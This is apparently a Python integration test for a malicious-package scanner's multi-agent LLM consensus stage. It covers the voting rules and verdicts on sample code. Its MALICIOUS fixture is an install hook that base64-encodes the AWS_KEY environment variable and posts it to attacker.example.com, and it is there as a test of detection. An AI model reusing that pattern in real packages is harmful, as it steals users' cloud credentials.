"""LLM Multi-Agent Stage 5 통합 테스트 (stub 모드)."""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from pkgsentinel.schema import LLMVerdict
from pkgsentinel.stages.stage1_entry_point import EntryFile
from pkgsentinel.stages.stage2_behavior import _analyze_python
from pkgsentinel.stages.stage5_multi_agent import (
    AgentReport,
    consensus,
    consensus_to_llm_response,
    review_multi,
)

MALICIOUS = '''
import os, base64, requests
class CustomInstall:
    def run(self):
        creds = os.environ.get("AWS_KEY")
        payload = base64.b64encode(creds.encode())
        requests.post("https://attacker.example.com", data=payload, verify=False)
'''

BENIGN = '''
import json
def parse(data):
    return json.loads(data)
'''


def test_consensus_rules():
    print("== Consensus rule tests ==")
    # 3개 다 BENIGN → BENIGN
    c = consensus([
        AgentReport("a", LLMVerdict.BENIGN, "", "", 0.4),
        AgentReport("b", LLMVerdict.BENIGN, "", "", 0.4),
        AgentReport("c", LLMVerdict.BENIGN, "", "", 0.4),
    ])
    assert c.verdict == LLMVerdict.BENIGN, f"expected BENIGN, got {c.verdict}"
    print(f"  3xBENIGN -> {c.verdict.value} (agreement {c.agreement_ratio:.2f})  OK")

    # 1 MALICIOUS + 1 SUSPICIOUS + 1 BENIGN → MALICIOUS (rule 2)
    c = consensus([
        AgentReport("a", LLMVerdict.MALICIOUS, "", "", 0.9),
        AgentReport("b", LLMVerdict.SUSPICIOUS, "", "", 0.6),
        AgentReport("c", LLMVerdict.BENIGN, "", "", 0.3),
    ])
    assert c.verdict == LLMVerdict.MALICIOUS, f"got {c.verdict}"
    print(f"  M+S+B -> {c.verdict.value}  OK")

    # 2 MALICIOUS → MALICIOUS
    c = consensus([
        AgentReport("a", LLMVerdict.MALICIOUS, "", "", 0.9),
        AgentReport("b", LLMVerdict.MALICIOUS, "", "", 0.85),
        AgentReport("c", LLMVerdict.BENIGN, "", "", 0.3),
    ])
    assert c.verdict == LLMVerdict.MALICIOUS
    print(f"  2xM -> {c.verdict.value}  OK")

    # 1 MALICIOUS only → SUSPICIOUS (보수)
    c = consensus([
        AgentReport("a", LLMVerdict.MALICIOUS, "", "", 0.9),
        AgentReport("b", LLMVerdict.BENIGN, "", "", 0.3),
        AgentReport("c", LLMVerdict.BENIGN, "", "", 0.3),
    ])
    assert c.verdict == LLMVerdict.SUSPICIOUS, f"got {c.verdict}"
    print(f"  1M+2B -> {c.verdict.value} (보수)  OK")

    # 2 SUSPICIOUS → SUSPICIOUS
    c = consensus([
        AgentReport("a", LLMVerdict.SUSPICIOUS, "", "", 0.6),
        AgentReport("b", LLMVerdict.SUSPICIOUS, "", "", 0.6),
        AgentReport("c", LLMVerdict.BENIGN, "", "", 0.3),
    ])
    assert c.verdict == LLMVerdict.SUSPICIOUS
    print(f"  2xS -> {c.verdict.value}  OK")
    return True


def test_malicious_consensus():
    print("\n== Stub multi-agent on MALICIOUS sample ==")
    file_seq = _analyze_python(EntryFile(
        path="evil/setup.py", basename="setup.py",
        content=MALICIOUS, size=len(MALICIOUS), language="python",
    ))
    c = review_multi(
        package="evil", version="0.0.1", ecosystem="PyPI",
        file_seq=file_seq, ttp_matches=[],
        code_snippet=MALICIOUS,
        version_diff_summary="2 file(s) changed, severity HIGH",
        new_apis=["os.environ.get", "requests.post"],
        description="json parser",
        declared_deps=["psutil"],
        taint_slice="os.environ.get -> base64.b64encode -> requests.post",
        mode="stub",
    )
    print(f"  verdict   : {c.verdict.value}")
    print(f"  agreement : {c.agreement_ratio:.2f}")
    for a in c.agent_reports:
        print(f"    [{a.name}] {a.verdict.value} (conf={a.confidence:.2f})")
    assert c.verdict == LLMVerdict.MALICIOUS, f"expected MALICIOUS, got {c.verdict}"
    print("  OK")
    return True


def test_benign_consensus():
    print("\n== Stub multi-agent on BENIGN sample ==")
    file_seq = _analyze_python(EntryFile(
        path="lib/parser.py", basename="parser.py",
        content=BENIGN, size=len(BENIGN), language="python",
    ))
    c = review_multi(
        package="json-tools", version="1.0.0", ecosystem="PyPI",
        file_seq=file_seq, ttp_matches=[],
        code_snippet=BENIGN,
        version_diff_summary=None,
        new_apis=[],
        description="A useful JSON parsing library with safe defaults.",
        declared_deps=[],
        taint_slice=None,
        mode="stub",
    )
    print(f"  verdict   : {c.verdict.value}")
    print(f"  agreement : {c.agreement_ratio:.2f}")
    for a in c.agent_reports:
        print(f"    [{a.name}] {a.verdict.value} (conf={a.confidence:.2f})")
    assert c.verdict == LLMVerdict.BENIGN, f"expected BENIGN, got {c.verdict}"
    print("  OK")
    return True


def test_adapter():
    print("\n== consensus_to_llm_response adapter ==")
    c = consensus([
        AgentReport("semantic_agent", LLMVerdict.MALICIOUS, "creds chain", "file=x", 0.9),
        AgentReport("diff_agent", LLMVerdict.SUSPICIOUS, "diff", "diff-info", 0.6),
        AgentReport("dependency_agent", LLMVerdict.BENIGN, "ok", "", 0.3),
    ])
    resp = consensus_to_llm_response(c)
    assert resp.verdict == LLMVerdict.MALICIOUS
    assert "semantic_agent" in resp.most_convincing_evidence
    print(f"  verdict={resp.verdict.value}, model={resp.model}")
    print(f"  most_convincing={resp.most_convincing_evidence}")
    print("  OK")
    return True


def main():
    ok = True
    ok &= test_consensus_rules()
    ok &= test_malicious_consensus()
    ok &= test_benign_consensus()
    ok &= test_adapter()
    print("\n" + ("ALL OK" if ok else "FAILED"))


if __name__ == "__main__":
    main()
